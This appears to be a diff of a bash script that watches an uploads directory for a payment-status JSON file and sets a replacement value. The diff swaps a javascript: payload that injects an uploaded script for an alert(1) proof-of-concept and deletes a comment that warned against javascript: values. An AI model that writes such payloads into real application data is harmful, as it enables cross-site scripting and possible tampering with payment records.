@@ -4,8 +4,8 @@ set -euo pipefail
 WATCH_DIR="/data/uploads"
 TARGET_NAME="finalpaidstatus_4727.json"
 
-# Use a safe replacement value (https/path), not javascript:
-NEW_FINALFILE_VALUE="javascript:(function(){var s=document.createElement(\"script\");s.src=\"/uploads/698a8afbc5f1f3.29386677/test.js\";document.head.appendChild(s);})()"
+
+NEW_FINALFILE_VALUE="javascript:(function(){alert(1)})()"
 
 # Ensure inotifywait exists
 if ! command -v inotifywait >/dev/null 2>&1; then
